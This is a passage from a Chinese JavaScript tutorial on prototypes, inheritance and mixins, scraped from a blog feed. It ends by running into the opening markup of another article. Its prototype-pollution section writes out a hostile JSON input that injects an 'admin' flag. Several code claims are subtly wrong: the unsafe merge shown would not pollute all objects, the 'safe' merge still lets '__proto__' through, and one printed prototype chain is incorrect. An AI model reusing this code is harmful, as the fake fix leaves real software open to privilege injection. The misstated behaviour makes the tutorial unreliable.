<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;

<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">childMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child method:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);
};

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">10</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'name'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'parentMethod'</span>));  <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-17">7.2 ES6 类继承</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello from <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  
  <span class="hljs-title function_">sayAge</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">12</span>);

<span class="hljs-comment">// 本质上还是原型继承</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Parent</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h2 data-id="heading-18">8. 性能考虑</h2>
<h3 data-id="heading-19">8.1 原型链查找优化</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// JavaScript 引擎会优化原型链查找</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getProperty</span>(<span class="hljs-params">obj, prop</span>) {
  <span class="hljs-comment">// 1. 检查对象自身属性</span>
  <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(prop)) {
    <span class="hljs-keyword">return</span> obj[prop];
  }
  
  <span class="hljs-comment">// 2. 查找原型链</span>
  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);
  <span class="hljs-keyword">while</span> (proto) {
    <span class="hljs-keyword">if</span> (proto.<span class="hljs-title function_">hasOwnProperty</span>(prop)) {
      <span class="hljs-keyword">return</span> proto[prop];
    }
    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
}
</code></pre>
<h3 data-id="heading-20">8.2 避免修改 <code>__proto__</code></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ❌ 不推荐：直接修改 __proto__</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'修改 __proto__'</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
  obj.<span class="hljs-property">__proto__</span> = { <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> };
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'修改 __proto__'</span>);

<span class="hljs-comment">// ✅ 推荐：使用 Object.setPrototypeOf</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'Object.setPrototypeOf'</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, { <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> });
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'Object.setPrototypeOf'</span>);

<span class="hljs-comment">// 最佳：创建时就确定原型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'Object.create'</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
  <span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>({ <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> });
  newObj.<span class="hljs-property">x</span> = <span class="hljs-number">1</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'Object.create'</span>);


<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// 修改 __proto__: 16.87109375 ms</span>
<span class="hljs-comment">// Object.setPrototypeOf: 37.158203125 ms</span>
<span class="hljs-comment">// Object.create: 19.46484375 ms</span>
</code></pre>
<h2 data-id="heading-21">9. 实际应用</h2>
<h3 data-id="heading-22">9.1 对象扩展</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 使用原型扩展内置对象</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span>) {
  <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">predicate</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">predicate</span>(<span class="hljs-variable language_">this</span>[i], i, <span class="hljs-variable language_">this</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[i];
      }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
  };
}

<span class="hljs-comment">// 检查是否是自定义扩展</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([].<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'find'</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([].<span class="hljs-property">__proto__</span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'find'</span>));  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-23">9.2 混入模式</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 使用原型实现混入</span>
<span class="hljs-keyword">const</span> canEat = {
  <span class="hljs-title function_">eat</span>(<span class="hljs-params">food</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> eats <span class="hljs-subst">${food}</span>`</span>);
  }
};

<span class="hljs-keyword">const</span> canSleep = {
  <span class="hljs-title function_">sleep</span>(<span class="hljs-params">hours</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> sleeps for <span class="hljs-subst">${hours}</span> hours`</span>);
  }
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 混入到原型</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, canEat, canSleep);

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">'Dog'</span>);
dog.<span class="hljs-title function_">eat</span>(<span class="hljs-string">'meat'</span>);
dog.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">8</span>);

<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// Dog eats meat</span>
<span class="hljs-comment">// Dog sleeps for 8 hours</span>
</code></pre>
<h3 data-id="heading-24">9.3 原型检测</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 检测对象关系</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getPrototypeChain</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">const</span> chain = [];
  <span class="hljs-keyword">let</span> current = obj;
  
  <span class="hljs-keyword">while</span> (current) {
    chain.<span class="hljs-title function_">push</span>(current.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span> || <span class="hljs-string">'[Anonymous]'</span>);
    current = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(current);
  }
  
  <span class="hljs-keyword">return</span> chain;
}

<span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getPrototypeChain</span>(arr));  <span class="hljs-comment">// ["Array", "Object", "[Anonymous]"]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getPrototypeChain</span>(<span class="hljs-title class_">Function</span>));  <span class="hljs-comment">// ["Function", "Object", "[Anonymous]"]</span>
</code></pre>
<h2 data-id="heading-25">10. 常见误区</h2>
<h3 data-id="heading-26">10.1 混淆 prototype 和 <code>__proto__</code></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyClass</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// ❌ 错误理解</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MyClass</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// false</span>

<span class="hljs-comment">// ✅ 正确理解</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MyClass</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>

<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-27">10.2 修改构造函数的 prototype</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Original</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Original</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-number">1</span>;

<span class="hljs-keyword">const</span> obj1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Original</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">value</span>);  <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// 修改构造函数的 prototype</span>
<span class="hljs-title class_">Original</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = { <span class="hljs-attr">value</span>: <span class="hljs-number">2</span> };

<span class="hljs-keyword">const</span> obj2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Original</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">value</span>);  <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">value</span>);  <span class="hljs-comment">// 1，已存在的对象不受影响</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">__proto__</span> === obj2.<span class="hljs-property">__proto__</span>);  <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-28">10.3 原型污染</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 原型污染攻击</span>
<span class="hljs-comment">// ❌ 危险：用户输入控制原型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">unsafeMerge</span>(<span class="hljs-params">target, source</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) {
    target[key] = source[key];
  }
  <span class="hljs-keyword">return</span> target;
}

<span class="hljs-keyword">const</span> userInput = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"__proto__": {"admin": true}}'</span>);
<span class="hljs-keyword">const</span> config = {};
<span class="hljs-title function_">unsafeMerge</span>(config, userInput);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>({}.<span class="hljs-property">admin</span>);  <span class="hljs-comment">// true！污染了所有对象</span>

<span class="hljs-comment">// ✅ 安全的方法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeMerge</span>(<span class="hljs-params">target, source</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) {
    <span class="hljs-keyword">if</span> (source.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
      target[key] = source[key];
    }
  }
  <span class="hljs-keyword">return</span> target;
}
</code></pre>
<h2 data-id="heading-29">11. 现代最佳实践</h2>
<h3 data-id="heading-30">11.1 使用 ES6 类</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Base</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, value</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;
  }
  
  <span class="hljs-title function_">showValue</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Value: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.value}</span>`</span>);
  }
}

<span class="hljs-comment">// 清晰的继承关系</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Derived</span>) === <span class="hljs-title class_">Base</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Derived</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) === <span class="hljs-title class_">Base</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-31">11.2 使用 Object.create</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 组合式继承</span>
<span class="hljs-keyword">const</span> canFly = {
  <span class="hljs-title function_">fly</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is flying`</span>);
  }
};

<span class="hljs-keyword">const</span> canSwim = {
  <span class="hljs-title function_">swim</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is swimming`</span>);
  }
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createAnimal</span>(<span class="hljs-params">name, abilities</span>) {
  <span class="hljs-keyword">const</span> animal = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(
    abilities.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">proto, ability</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto), ability);
    }, { name })
  );
  <span class="hljs-keyword">return</span> animal;
}

<span class="hljs-keyword">const</span> duck = <span class="hljs-title function_">createAnimal</span>(<span class="hljs-string">'Duck'</span>, [canFly, canSwim]);
duck.<span class="hljs-title function_">fly</span>();
duck.<span class="hljs-title function_">swim</span>();
</code></pre>
<h3 data-id="heading-32">11.3 使用代理</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 使用 Proxy 控制原型访问</span>
<span class="hljs-keyword">const</span> handler = {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) {
    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'__proto__'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Direct __proto__ access is forbidden'</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, prop);
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) {
    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'__proto__'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Direct __proto__ modification is forbidden'</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, prop, value);
  }
};

<span class="hljs-keyword">const</span> safeObject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>({}, handler);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(safeObject.<span class="hljs-property">x</span> = <span class="hljs-number">1</span>);  <span class="hljs-comment">// 正常</span>
<span class="hljs-comment">// safeObject.__proto__ = {};  // 抛出错误</span>
</code></pre>
<h2 data-id="heading-33">总结</h2>
<h3 data-id="heading-34">关键点</h3>
<ol>
<li><strong><code>prototype</code>是函数的属性</strong>，用于定义通过该函数作为构造函数创建的对象所共享的属性和方法</li>
<li><strong><code>__proto__</code>是对象的属性</strong>，指向创建该对象的构造函数的 <code>prototype</code></li>
<li><strong>原型链是通过 <code>__proto__</code>链接的</strong>，而不是 <code>prototype</code></li>
<li><strong>使用标准方法</strong>：<code>Object.getPrototypeOf()</code>和 <code>Object.setPrototypeOf()</code></li>
</ol>
<h3 data-id="heading-35">记忆口诀</h3>
<pre><code class="hljs language-js" lang="js">函数有prototype，对象有__proto__

<span class="hljs-keyword">new</span>的时候，对象.<span class="hljs-property">__proto__</span> = 函数.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>

原型链是对象链，函数只在链的开端

标准方法更可靠，__proto__要慎用
</code></pre>
<h3 data-id="heading-36">现代开发建议</h3>
<ul>
<li>使用 ES6 类语法</li>
<li>避免直接操作 <code>__proto__</code></li>
<li>使用 <code>Object.create()</code>创建对象</li>
<li>了解原型机制，但让框架/引擎处理细节</li>
<li>注意原型污染的安全问题</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[unplugin-vue-router文件路由实操]]></title>    <link>https://juejin.cn/post/7581789701531828266</link>    <guid>https://juejin.cn/post/7581789701531828266</guid>    <pubDate>2025-12-10T05:04:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581789701531828266" data-draft-id="7581738974424612883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="unplugin-vue-router文件路由实操"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T05:04:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LCC"/> <meta itemprop="url" content="https://juejin.cn/user/4226999541563453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            unplugin-vue-router文件路由实操
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4226999541563453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LCC
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:04:37.000Z" title="Wed Dec 10 2025 05:04:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 